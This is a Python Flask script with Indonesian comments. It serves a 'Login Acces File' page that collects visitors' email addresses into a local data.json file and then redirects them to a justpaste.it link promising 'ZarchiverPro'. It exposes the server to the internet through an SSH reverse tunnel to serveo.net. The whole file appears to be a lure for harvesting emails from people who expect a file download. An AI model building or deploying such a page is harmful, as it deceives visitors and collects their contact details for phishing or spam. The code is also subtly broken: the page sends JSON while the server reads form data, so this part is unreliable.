import subprocess
from flask import Flask, request, jsonify
import json
import os

app = Flask(__name__)

# Isi dari file index.html disisipkan langsung dalam string
index_html = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Email Input Form</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background-color: #f4f4f4;
    }
    #emailFormContainer {
        width: 100%;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;
    }
    #emailForm {
        text-align: center;
        background-color: #fff;
        padding: 20px;
        border-radius: 8px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }
    #email {
        width: 300px;
        padding: 10px;
        margin-bottom: 10px;
        border: 1px solid #ccc;
        border-radius: 4px;
        box-sizing: border-box;
    }
    #continueBtn {
        padding: 10px 20px;
        background-color: #007bff;
        color: #fff;
        border: none;
        border-radius: 4px;
        cursor: pointer;
    }
    #countdown {
        margin-top: 20px;
        font-size: 18px;
    }
</style>
</head>
<body>
    <div id="emailFormContainer">
        <form id="emailForm" action="/submit_email" method="POST">
            <strong><h> Login Acces File</h></strong><br><br>
            <strong><label for="email">Email:</strong></label><br><br>
            <input type="email" id="email" name="email" required><br><br>
            <input type="submit" value="Continue" id="continueBtn">
        </form>
        <div id="countdown" style="display: none;"></div>
    </div>
    <script>
        function startCountdown() {
            var countdownElement = document.getElementById('countdown');
            countdownElement.style.display = 'block';
            var seconds = 10;
            var countdownInterval = setInterval(function() {
                countdownElement.innerText = 'Redirecting in ' + seconds + ' seconds';
                seconds -= 1;
                if (seconds < 0) {
                    clearInterval(countdownInterval);
                    window.location.href = 'https://justpaste.it/ZarchiverPro';
                }
            }, 1000);
        }
        
        document.getElementById('emailForm').addEventListener('submit', function(event) {
            event.preventDefault();
            var email = document.getElementById('email').value.trim();
            var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (emailPattern.test(email)) {
                document.getElementById('continueBtn').disabled = true;
                startCountdown();
                fetch('/submit_email', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ email: email })
                }).then(function(response) {
                    return response.json();
                }).then(function(data) {
                    console.log(data);
                }).catch(function(error) {
                    console.error('Error:', error);
                });
            } else {
                alert('Invalid email address. Please enter a valid email.');
            }
        });

        // Memuat ulang halaman jika pengguna kembali ke halaman input email
        window.addEventListener('pageshow', function(event) {
            if (event.persisted) {
                window.location.reload();
            }
        });
    </script>
</body>
</html>
"""

# Fungsi untuk menyimpan email ke dalam file data.json dan mengatur data.json
def save_email(email):
    data = {'emails': []}
    if os.path.exists('data.json'):
        with open('data.json', 'r') as file:
            data = json.load(file)
    if email not in data['emails']:
        data['emails'].append(email)
        with open('data.json', 'w') as file:
            json.dump(data, file, indent=4)

# Route untuk halaman awal
@app.route('/')
def index():
    return index_html

# Route untuk menyimpan email
@app.route('/submit_email', methods=['POST'])
def submit_email():
    email = request.form['email']
    save_email(email)
    return jsonify({'message': 'Email submitted successfully.'})

# Jalankan SSH
def run_ssh():
    subprocess.run(["ssh", "-R", "80:127.0.0.1:5000", "serveo.net"])

if __name__ == '__main__':
    if not os.path.exists('data.json'):
        with open('data.json', 'w') as file:
            json.dump({'emails': []}, file)
    # Jalankan SSH di thread terpisah
    import threading
    ssh_thread = threading.Thread(target=run_ssh)
    ssh_thread.start()
    # Jalankan Flask
    app.run(debug=True)
